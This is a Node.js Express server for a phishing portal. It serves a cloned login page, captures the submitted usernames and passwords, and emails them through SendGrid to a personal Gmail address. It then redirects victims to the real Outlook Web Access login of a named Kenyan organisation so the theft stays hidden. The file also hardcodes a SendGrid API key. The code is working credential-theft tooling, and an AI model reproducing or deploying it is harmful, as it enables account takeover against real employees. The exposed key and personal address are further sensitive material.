const express = require('express')
const bodyParser = require('body-parser')
const exphbs = require('express-handlebars')
const path = require('path');
const sgMail = require('@sendgrid/mail');

const app = express();

//view engine setup
app.engine('handlebars',exphbs())
app.set('view engine','handlebars')

// Static folder
app.use('/public', express.static(path.join(__dirname,'public')))

// Body parser Middleware
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

//render cloned page
//default view in views/"view to be rendered".handlebars
app.get('/',(req, res) => {
	res.render('Image')
})

//send email on sendgrid
sgMail.setApiKey("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");

app.post('/send', (req, res) => {
console.log(req.body)
    const output = `
		<p>You have a new password entry from Phishing Portal</p>
		<h3>User Details</h3>
		<ul>
        
            <li>USERNAME: ${req.body.username}</li>
			<li>Password:${req.body.passwd}</li>
		</ul>
	`
    const msg = {
        to: 'wambutujoseph@gmail.com',
        from: 'supporit@image.co.ke',
        subject: 'IMAGE PHISHING MAIL',
        text: 'So',
        html: output,
      };
      console.log("Sending an email....");
      sgMail.send(msg);
      console.log("Email sent....");
      res.redirect('https://mail.image.co.ke/owa/auth/logon.aspx?')
})

var port = process.env.PORT || 8000

app.listen(port, function() {
    console.log("App is running on port " + port);
});
